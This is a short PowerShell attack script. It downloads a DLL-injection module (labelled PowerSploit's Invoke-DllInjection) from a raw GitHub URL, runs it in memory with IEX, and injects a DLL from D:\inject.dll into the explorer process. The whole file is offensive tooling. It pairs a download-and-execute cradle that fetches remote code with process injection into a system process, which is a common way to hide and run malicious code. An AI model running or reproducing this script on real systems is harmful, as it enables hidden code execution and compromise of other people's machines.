# Set the security protocol to TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

# Download and execute the PowerSploit Invoke-DllInjection script
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GVO72/SSR_FP/main/Invoke-DllInjection.ps1')

# Specify the name of the process to search for
$processName = "explorer"

# Get the Process ID of the specified process
$process = Get-Process -Name $processName -ErrorAction SilentlyContinue | Select-Object -First 1
if ($process -eq $null) {
    Write-Host "Process '$processName' not found."
    exit
}
$processID = $process.Id

# Invoke the DLL injection with the selected ProcessID and DLL path
Invoke-DllInjection -ProcessID $processID -Dll D:\inject.dll
